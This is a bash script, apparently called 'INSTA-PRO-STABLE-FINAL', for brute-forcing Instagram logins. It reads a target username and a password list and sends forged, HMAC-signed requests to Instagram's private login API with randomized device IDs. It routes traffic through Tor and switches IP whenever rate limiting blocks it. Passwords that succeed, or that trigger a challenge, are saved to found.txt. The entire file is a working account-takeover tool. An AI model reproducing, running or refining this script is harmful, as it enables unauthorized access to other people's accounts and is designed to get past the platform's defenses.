#!/bin/bash
# INSTA-PRO-STABLE-FINAL
# Coded by: Khalid Husain

trap 'exit 1' 2

# --- 1. Visual Banner ---
banner() {
    clear
    printf "\e[1;92m"
    printf "  ░█─▄▀ █──█ █▀▀█ █── ─▀─ █▀▀▄ 　 ░█─░█ █──█ █▀▀ █▀▀█ ─▀─ █▀▀▄\n"
    printf "  ░█▀▄─ █▀▀█ █▄▄█ █── ▀█▀ █──█ 　 ░█▀▀█ █──█ ▀▀█ █▄▄█ ▀█▀ █──█\n"
    printf "  ░█─░█ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀ ▀▀▀─ 　 ░█─░█ ─▀▀▀ ▀▀▀ ▀──▀ ▀▀▀ ▀──▀\n"
    printf "\e[1;77m\e[45m   FINAL STABLE VERSION {{Khalid Husain}}   \e[0m\n\n"
}

# --- 2. Connection Logic ---
get_token() {
    uuid=$(openssl rand -hex 16)
    token=$(curl -s -i "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" | grep -i "set-cookie: csrftoken=" | cut -d "=" -f2 | cut -d ";" -f1)
    echo "$token"
}

changeip() {
    printf "\e[1;91m[!] Limit hit. Getting new IP from Tor...\e[0m\n"
    killall -HUP tor 2>/dev/null
    sleep 4
}

# --- 3. Setup & Start ---
start() {
    banner
    # Check if necessary tools are installed
    for cmd in tor curl openssl; do
        command -v $cmd > /dev/null 2>&1 || { echo >&2 "Error: $cmd is not installed. Please install it."; exit 1; }
    done

    read -p $'\e[1;92mUsername account: \e[0m' user
    read -p $'\e[1;92mPassword List (e.g. pass.txt): \e[0m' wl_pass
    if [[ ! -f "$wl_pass" ]]; then echo "Error: File $wl_pass not found!"; exit 1; fi
}

# --- 4. Bruteforce Engine ---
bruteforcer() {
    csrftoken=$(get_token)
    if [[ -z "$csrftoken" ]]; then
        printf "\e[1;91m[!] ERROR: Tor is not running! Run: sudo service tor start\e[0m\n"
        exit 1
    fi

    printf "\e[1;92m[*] Target: $user | CSRF: $csrftoken\e[0m\n"
    
    while IFS= read -r pass; do
        # Clean the password string
        pass=$(echo "$pass" | tr -d '\r\n')
        if [[ -z "$pass" ]]; then continue; fi

        # Generate fresh IDs for each attempt
        guid=$(openssl rand -hex 16)
        device="android-$(openssl rand -hex 8)"
        
        # Prepare Data String
        data="{\"phone_id\":\"$guid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"password\":\"$pass\", \"login_attempt_count\":\"0\"}"
        sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$sig" | cut -d " " -f2)

        printf "\e[1;77mTesting: %-20s \e[0m" "$pass"

        # The API request via Tor SOCKS5
        response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
            -A "Instagram 155.0.0.37.107 Android (24/7.0; Xiaomi; Redmi Note 4)" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
            "https://i.instagram.com/api/v1/accounts/login/")

        # Result handling
        if [[ $response == *"logged_in_user"* ]]; then
            printf "\e[1;92m[FOUND!]\e[0m\n"
            echo "SUCCESS: $user : $pass" >> found.txt
            exit 0
        elif [[ $response == *"challenge"* ]]; then
            printf "\e[1;93m[FOUND - CHALLENGE REQ]\e[0m\n"
            echo "CHALLENGE: $user : $pass" >> found.txt
            exit 0
        elif [[ $response == *"Please wait"* || $response == *"many tries"* ]]; then
            printf "\e[1;91m[BLOCKED]\e[0m\n"
            changeip
            csrftoken=$(get_token)
        else
            printf "\e[1;90m[WRONG]\e[0m\n"
        fi
        
        # Human-like delay
        sleep 0.5
    done < "$wl_pass"
}

# Run the program
start
bruteforcer
